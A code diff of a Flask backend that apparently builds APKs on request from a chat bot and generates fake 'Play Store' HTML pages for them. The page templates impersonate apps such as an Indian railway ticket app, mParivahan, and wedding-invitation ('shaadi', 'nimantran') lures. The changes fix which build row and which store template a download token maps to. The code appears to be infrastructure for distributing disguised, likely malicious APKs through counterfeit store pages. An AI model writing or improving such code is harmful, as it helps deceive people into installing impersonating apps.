@@ -935,6 +935,7 @@ def build_complete():
     package_name  = str(data.get("package_name", "")).strip()
     apk_size      = str(data.get("apk_size", "")).strip()
     duration_secs = int(data.get("duration_secs", 0))
+    template      = str(data.get("template", "")).strip()  # used to validate fallback row match
 
     if not chat_id:
         return jsonify({"ok": False, "error": "chat_id required"}), 400
@@ -946,19 +947,36 @@ def build_complete():
 
         bot_db = sqlite3.connect(bot_db_path, timeout=5)
 
-        # Match by github_run_id first (most accurate — bot stores this after triggering)
-        # Fallback: latest building row for chat_id (covers edge cases)
+        # Match by github_run_id first (most accurate — bot stores this after triggering).
+        # If matched row's template doesn't match the payload template, it's a stale/wrong row —
+        # discard it and fall through to template-scoped fallback.
         row = None
         if github_run_id:
             row = bot_db.execute(
-                "SELECT id FROM builds WHERE chat_id=? AND github_run_id=? LIMIT 1",
+                "SELECT id, template FROM builds WHERE chat_id=? AND github_run_id=? LIMIT 1",
                 (chat_id, github_run_id)
             ).fetchone()
+            if row and template and row[1] != template:
+                log.warning(f"build_complete: run_id match found but template mismatch "
+                            f"(row={row[1]} payload={template}) — retrying with template filter")
+                row = None
+
         if not row:
-            row = bot_db.execute(
-                "SELECT id FROM builds WHERE chat_id=? ORDER BY id DESC LIMIT 1",
-                (chat_id,)
-            ).fetchone()
+            # Fallback: latest building row for chat_id filtered by template to avoid
+            # writing store_token to a build row of a different app type.
+            if template:
+                row = bot_db.execute(
+                    "SELECT id, template FROM builds WHERE chat_id=? AND template=? ORDER BY id DESC LIMIT 1",
+                    (chat_id, template)
+                ).fetchone()
+            if not row:
+                # Last resort: any latest row (no template known — legacy path)
+                row = bot_db.execute(
+                    "SELECT id, template FROM builds WHERE chat_id=? ORDER BY id DESC LIMIT 1",
+                    (chat_id,)
+                ).fetchone()
+                if row and template and row[1] != template:
+                    log.warning(f"build_complete: last-resort row template={row[1]} differs from payload={template}")
 
         if not row:
             bot_db.close()
@@ -1077,6 +1095,29 @@ def _get_icon_b64(template):
         pass
     return ""
 
+def _derive_template_from_slug(store_token):
+    """
+    Derive the best-matching template key from the store_token slug.
+    E.g. 'e57200cc-indian-railway-ticket' → 'railway'
+    Returns None if no known keyword matches.
+    """
+    slug = store_token.lower()
+    # Ordered: most specific first
+    _slug_map = [
+        ("railway",      ["railway", "indian-railway"]),
+        ("mparivahan",   ["mparivahan", "parivahan"]),
+        ("shaadi_hindi", ["shaadi-hindi", "nimantran"]),
+        ("shaadi",       ["shaadi"]),
+        ("wedding",      ["wedding"]),
+        ("friends",      ["friends"]),
+        ("bhabhi",       ["bhabhi"]),
+    ]
+    for tmpl_key, keywords in _slug_map:
+        if any(kw in slug for kw in keywords):
+            return tmpl_key
+    return None
+
+
 def _store_html(build):
     """Generate full Play Store HTML page for a build."""
     template     = build.get("template", "custom") or "custom"
@@ -1084,6 +1125,17 @@ def _store_html(build):
     pkg          = build.get("package_name", "") or ""
     apk_size_raw = build.get("apk_size", "24") or "24"
     store_token  = build.get("store_token", "") or ""
+
+    # Safety net: if DB template doesn't match STORE_TEMPLATES or the slug implies a
+    # different app, derive from the token slug to avoid showing the wrong store page.
+    if template not in STORE_TEMPLATES:
+        template = "custom"
+    if store_token:
+        slug_template = _derive_template_from_slug(store_token)
+        if slug_template and slug_template != template:
+            log.warning(f"_store_html: DB template={template!r} conflicts with slug-derived={slug_template!r} "
+                        f"for token={store_token!r} — using slug-derived template as ground truth")
+            template = slug_template
 
     tmpl_data    = STORE_TEMPLATES.get(template, STORE_TEMPLATES["custom"])
     emoji, app_name, dev_name, description, tags = tmpl_data
